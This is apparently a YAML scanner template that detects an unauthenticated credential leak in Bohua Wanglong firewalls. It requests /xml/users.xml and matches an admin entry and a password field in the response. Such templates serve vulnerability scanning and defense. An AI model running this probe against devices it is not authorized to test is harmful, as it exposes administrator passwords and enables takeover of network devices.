expression: r0()
id: bohuawanglong-users-xml-password-leak
info:
  author: zan8in
  description: "\u535A\u534E\u7F51\u9F99\u9632\u706B\u5899 users.xml\u6587\u4EF6 \u53EF\
    \u88AB\u4EFB\u610F\u7528\u6237\u8BFB\u53D6\uFF0C\u5176\u4E2D\u5305\u542B\u767B\
    \u5F55\u7684\u8D26\u53F7\u5BC6\u7801\n\"\u535A\u534E\u7F51\u9F99\u9632\u706B\u5899\
    \"\n"
  name: "\u535A\u534E\u7F51\u9F99\u9632\u706B\u5899 users.xml \u672A\u6388\u6743\u8BBF\
    \u95EE"
  reference:
  - http://wiki.peiqi.tech/wiki/iot/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99%20users.xml%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.html
  severity: high
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'name="admin"')
      && response.body.bcontains(b'pwd="')
    request:
      method: GET
      path: /xml/users.xml
